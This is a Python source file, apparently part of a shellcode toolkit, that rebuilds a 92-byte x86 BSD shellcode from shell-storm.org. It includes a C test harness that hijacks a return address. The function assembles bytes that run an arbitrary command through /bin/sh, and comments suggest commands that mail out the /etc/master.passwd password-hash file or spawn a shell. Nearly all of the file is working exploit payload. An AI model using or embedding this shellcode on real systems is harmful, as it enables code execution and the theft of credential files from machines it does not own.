#http://shell-storm.org/shellcode/files/shellcode-91.php


"""
/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   92 bytes.

   _execve(/bin/sh -c "/bin/cat /etc/master.passwd|mail root@localhost");
   pueden reemplzar el comando por lo que se les ocurra.
*/

main()
{
   int *ret;
   printf("Shellcode length=%d\n",sizeof(shellcode));
   ret=(int*)&ret+2;
   (*ret)=(int)shellcode;
}

"""

#Must be test ..

def execc( command):
	shellcode =  r"\xeb\x25"             #/* jmp     <_shellcode+39>         */
	shellcode += r"\x59"                 #/* popl    %ecx                   */
	shellcode += r"\x31\xc0"             #/* xorl    %eax,%eax              */
	shellcode += r"\x50"                 #/* pushl   %eax                   */
	shellcode += r"\x68\x6e\x2f\x73\x68" #/* push    $0x68732f6e            */
	shellcode += r"\x68\x2f\x2f\x62\x69" #/* push    $0x69622f2f            */
	shellcode += r"\x89\xe3"             #/* movl    %esp,%ebx              */
	shellcode += r"\x50"                 #/* pushl   %eax                   */
	shellcode += r"\x66\x68\x2d\x63"     #/* pushw   $0x632d                */
	shellcode += r"\x89\xe7"             #/* movl    %esp,%edi              */
	shellcode += r"\x50"                 #/* pushl   %eax                   */
	shellcode += r"\x51"                 #/* pushl   %ecx                   */
	shellcode += r"\x57"                 #/* pushl   %edi                   */
	shellcode += r"\x53"                 #/* pushl   %ebx                   */
	shellcode += r"\x89\xe7"             #/* movl    %esp,%edi              */
	shellcode += r"\x50"                 #/* pushl   %eax                   */
	shellcode += r"\x57"                 #/* pushl   %edi                   */
	shellcode += r"\x53"                 #/* pushl   %ebx                   */
	shellcode += r"\x50"                 #/* pushl   %eax                   */
	shellcode += r"\xb0\x3b"             #/* movb    $0x0b,%al              */
	shellcode += r"\xcd\x80"             #/* int     $0x80                  */
	shellcode += r"\xe8\xd6\xff\xff\xff" #/* call    <_shellcode+2>          */
	#"/bin/cat /etc/master.passwd|mail root@localhost";
	# /bin/sh -c "/bin/sh"
	shellcode += command
	return shellcode

